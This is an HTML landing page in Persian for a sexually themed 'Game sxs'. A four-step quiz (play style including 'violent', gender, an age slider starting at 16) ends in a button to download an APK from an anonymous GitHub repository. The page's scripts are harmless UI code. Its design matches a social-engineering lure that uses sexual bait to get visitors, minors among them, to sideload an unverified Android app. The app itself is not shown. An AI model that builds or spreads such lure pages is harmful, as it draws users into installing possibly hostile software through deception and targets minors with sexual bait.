<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Game sxs</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{
  font-family:'Roboto',sans-serif;
  background: url("https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/5936243320109599834.jpg") center/cover no-repeat fixed;
  color:#fff;
  text-align:center;
  overflow-x:hidden;
}

/* هدر */
header{
  padding:20px;
  font-size:28px;
  font-weight:700;
  font-family:'Orbitron', sans-serif;
  background: linear-gradient(90deg,#00f,#0ff,#0f0);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}

/* کادر تصویر مرحله */
.top-box{
  width:90%;
  max-width:400px;
  height:250px;
  margin:0 auto 30px auto;
  border-radius:25px;
  overflow:hidden;
  border:3px solid #0ff;
  box-shadow:0 0 20px #0ff inset,0 0 40px #0ff;
  transition: background-image 0.5s ease;
  background-size: contain;
  background-position: center;
  background-repeat: no-repeat;
  position: relative;
}

/* لایه نیمه شفاف برای متن روی تصویر */
.top-box::after{
  content:'';
  position:absolute;
  top:0; left:0;
  width:100%; height:100%;
  background: rgba(0,0,0,0.45);
}

/* مرحله‌ها */
.step{
  display:none;
  padding:15px;
  opacity:0;
  transform:translateY(30px);
  transition: all 0.5s ease;
}
.step.active{
  display:block;
  opacity:1;
  transform:translateY(0);
}
h2{
  margin-bottom:20px;
  font-family:'Orbitron',sans-serif;
  color:#0ff;
  text-shadow:0 0 10px #000;
  background: rgba(0,0,0,0.5);
  display:inline-block;
  padding:5px 15px;
  border-radius:12px;
}

/* گزینه‌ها */
.options{
  display:flex;
  flex-wrap:wrap;
  justify-content:center;
  gap:12px;
}
.option{
  width:80px;
  height:80px;
  line-height:80px;
  font-size:18px;
  border-radius:16px;
  cursor:pointer;
  border:2px solid #0ff;
  background: linear-gradient(145deg,#111,#222);
  color:#fff;
  font-weight:500;
  transition:0.3s all;
  text-shadow: 0 0 5px #000;
}
.option:hover{
  transform:scale(1.1);
  background: linear-gradient(145deg,#0ff,#0cc);
  color:#000;
}
.option.selected{
  background:#0ff;
  color:#000;
  border-color:#0ff;
  box-shadow:0 0 25px #0ff;
}

/* دکمه ادامه */
button{
  margin-top:20px;
  padding:14px 40px;
  font-size:18px;
  border:none;
  border-radius:14px;
  cursor:pointer;
  display:none;
  color:#000;
  background: linear-gradient(135deg,#00ffff,#00ccff,#00ffff);
  box-shadow:0 0 15px #00ffff,0 0 30px #0ff inset;
  font-weight:600;
  transition:0.3s all;
}
button.show{display:inline-block;}
button:hover{
  transform:scale(1.05);
  box-shadow:0 0 25px #0ff,0 0 50px #0ff inset;
}

/* اسلایدر سن */
input[type=range]{
  -webkit-appearance:none;
  width:90%;
  max-width:300px;
  height:14px;
  border-radius:7px;
  background:#333;
  outline:none;
  margin:20px 0;
}
input[type=range]::-webkit-slider-thumb{
  -webkit-appearance:none;
  width:36px;height:36px;border-radius:50%;
  background:#0ff;
  cursor:pointer;
  box-shadow:0 0 15px #0ff;
}
input[type=range]::-moz-range-thumb{
  width:36px;height:36px;border-radius:50%;
  background:#0ff;
  cursor:pointer;
  box-shadow:0 0 15px #0ff;
}
#ageDisplay{
  font-size:22px;
  font-weight:700;
  color:#0ff;
  margin-top:10px;
  background: rgba(0,0,0,0.5);
  display:inline-block;
  padding:5px 12px;
  border-radius:10px;
}

/* کادر دانلود */
.download-box{
  position:relative;
  background: linear-gradient(145deg,#0ff,#00ccff);
  padding:25px 20px;
  border-radius:25px;
  box-shadow:0 0 40px #0ff,0 0 80px #0ff inset;
  margin:30px auto;
  text-align:center;
  overflow:hidden;
  transition:0.3s all;
}
.download-box:hover{
  transform:scale(1.03);
  box-shadow:0 0 50px #0ff,0 0 100px #0ff inset;
}
.download-box p{
  font-size:18px;
  font-weight:700;
  margin-bottom:20px;
  color:#000;
  text-shadow:0 0 5px #fff;
  background: rgba(255,255,255,0.2);
  display:inline-block;
  padding:5px 15px;
  border-radius:12px;
}
.download-btn{
  background:#fff;
  color:#0ff;
  padding:14px 40px;
  font-size:18px;
  border-radius:14px;
  text-decoration:none;
  display:inline-block;
  font-weight:700;
  box-shadow:0 0 25px #0ff;
  transition:0.3s all;
  position:relative;
  z-index:2;
}
.download-btn:hover{
  background:#0cc;
  color:#000;
  box-shadow:0 0 35px #0ff,0 0 70px #0ff inset;
}

/* ریسپانسیو موبایل */
@media(max-width:480px){
  header{font-size:24px;padding:15px;}
  .top-box{height:180px;border-radius:20px;}
  .option{width:70px;height:70px;line-height:70px;font-size:16px;}
  input[type=range]{width:95%;}
  #ageDisplay{font-size:20px;}
  button, .download-btn{padding:12px 35px;font-size:16px;}
  .download-box{padding:20px;}
  .download-box p{font-size:16px;}
}
</style>
</head>
<body>

<header>🎮 Game sxs 🥵</header>
<div class="top-box" id="topBox"></div>

<!-- مرحله 1 -->
<div class="step active" id="step1">
  <h2>1/4<br>سبک بازی خود را انتخاب کنید</h2>
  <div class="options">
    <div class="option" onclick="selectOption(this,1)">کلاسیک</div>
    <div class="option" onclick="selectOption(this,1)">ریلکس</div>
    <div class="option" onclick="selectOption(this,1)">خشن</div>
  </div>
  <button id="btn1" onclick="nextStep(2,'https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/5936243320109599833.jpg')">ادامه</button>
</div>

<!-- مرحله 2 -->
<div class="step" id="step2">
  <h2>2/4<br>جنسیت خود را انتخاب کنید</h2>
  <div class="options">
    <div class="option" onclick="selectOption(this,2)">مرد</div>
    <div class="option" onclick="selectOption(this,2)">زن</div>
  </div>
  <button id="btn2" onclick="nextStep(3,'https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/5936243320109599835.jpg')">ادامه</button>
</div>

<!-- مرحله 3 -->
<div class="step" id="step3">
  <h2>3/4<br>سن خود را انتخاب کنید</h2>
  <input type="range" id="age" min="16" max="70" value="25" oninput="updateAge(this.value)">
  <div id="ageDisplay">25 سال</div>
  <button id="btn3" onclick="nextStep(4,'https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/5936243320109599836.jpg')">ادامه</button>
</div>

<!-- مرحله 4 -->
<div class="step" id="step4">
  <h2>4/4</h2>
  <div class="download-box">
    <p>برای اجرای بازی، فایل بازی را دانلود کنید</p>
    <a class="download-btn" href="https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/Game_sxs_1.apk" download>دانلود بازی</a>
  </div>
</div>

<script>
function selectOption(el,step){
  document.querySelectorAll('#step'+step+' .option').forEach(o=>o.classList.remove('selected'));
  el.classList.add('selected');
  document.getElementById('btn'+step).classList.add('show');
}

function nextStep(step,img){
  const current=document.querySelector('.step.active');
  current.classList.remove('active');
  setTimeout(()=>{
    document.getElementById('step'+step).classList.add('active');
    document.getElementById('topBox').style.backgroundImage = 'url('+img+')';
  },150);
}

function updateAge(val){
  document.getElementById('ageDisplay').innerText=val+" سال";
  if(val>=16 && val<=70){document.getElementById('btn3').classList.add('show');}
  else{document.getElementById('btn3').classList.remove('show');}
}

// تصویر مرحله اول
document.getElementById('topBox').style.backgroundImage = 'url(https://cdn.jsdelivr.net/gh/SHAKI0010/apk-files-shaki@main/5936111855455636287.jpg)';
</script>

</body>
</html>
